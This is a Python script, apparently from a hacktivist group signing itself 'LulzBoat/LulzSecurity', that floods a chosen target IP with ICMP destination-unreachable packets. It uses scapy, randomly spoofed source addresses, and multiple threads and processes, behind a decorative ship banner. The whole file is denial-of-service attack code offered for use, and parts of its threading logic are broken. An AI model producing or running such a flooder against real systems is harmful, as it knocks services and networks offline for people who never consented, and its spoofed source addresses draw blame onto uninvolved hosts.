#!/usr/bin/env python
############################################
# LulzNurse		                           #
# A multithreaded multiprocess             #
# ICMP Type 3 Code 0-3 Flooder            #
# By:The LulzBoat  			               #
#                                          #
############################################
import socket, random, sys, threading, multiprocessing
from scapy.all import *


if len(sys.argv) != 4:
	print "Usage: %s <Target IP> <Number of Threads> <Number of Processes>" % sys.argv[0]
	sys.exit(1)

target = sys.argv[1]
rthread = int(sys.argv[2]) #You Don't Seem to Need a Ton of Threads Since This is Multi-processed
multi = int(sys.argv[3]) #Number of Processes Should not exceed The Number of Cores in Your Computer

conf.iface='wlan0';#This is Your Network Card Change as is Appropriate
total = 0
data = "\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

def goodbye():
    sys.exit("\n" + "*" *43 + "\n\nBye! Come use me again!\n\n" + "*" *43 + "")
	

print"""
                _.--| LuLz|:                    
               <____|.----||                    
                      .---''---,                
   The                 ;..__..'    _...         
    Lulz            , '/  ||/..--''    \        
     Boat         ,'_ /'.-||            :       
      2017   _..-' ''/    ||  \    \   _|/|     
           \        /-._;/||   \    \,;'   \    
           ,\      /    /`||    \   //    `:`.  
         ,'  \    /-._;/  ||    : ::    ,.   . 
       ,'     \  /    /`-.||    | || ' :  `.`.)
    _,'        |;._: /|  ;||    | `|   :    `' 
  ,'   `.      /    /`-:_/||    |  |  : \      
  `--.   )    /'-._/    /:||       |   \ \     
     /  /    /'_  /;`-./_;||__..--';    : :    
    /  (    /  -./_  _/  .||'o |   /     ' |    
   /  , \._/_/_./--''/_  /||___|_,'      | |    
  :  /   `'-'--'----'---------'          / |    
  | :     O ._O   O_. O ._O   O_.       ; ;    
  : `.      //    //    //    //       /     
~~~`.______//____//____//____//_______ ,'~~     
          //    //~   //    // ~ ~ ~ ~~~~    
   ~~   _//   _//   _// ~ _//    ~  ~ ~ ~    
 ~     / /   / /   / /   / /  ~      ~~       
      ~~~   ~~~   ~~~   ~~~                   
                                   Setting Sail to the horizon. 
                                          Yours Truly.
                                        LulzSecurity2017
                                           Lulz Zombie   """

class sendICMP(threading.Thread):

    def __init__(self):
	    threading.Thread.__init__(self)
            
    def threading(self):         
            threading.thread = rthread
            threading.thread(target=run)
            rthread.start()
            rthread.join()

    def run(self):
            global total
            while True:
               total = total + 1
               ip = IP()
	       ip.src = "%i.%i.%i.%i" % (random.randint(11,126),random.randint(1,254),random.randint(1,254),random.randint(1,254))
	       ip.dst = target
	       icmp = ICMP()
	       icmp.type = 3
	       icmp.code = random.randint(0,3)
               send(ip/icmp/data, verbose=0)
               sys.stdout.write("\r Packets Sended:\t\t\t%i" % total)
               break

print "Flooding %s with ICMP packets." % (target)

if __name__ == "__main__":
	while True:
                  try:
                     sendICMP().start()
                     multi = multiprocessing.Process(target=sendICMP)
                     multi.start()
                     multi.join()

                  except KeyboardInterrupt:
                      goodbye()
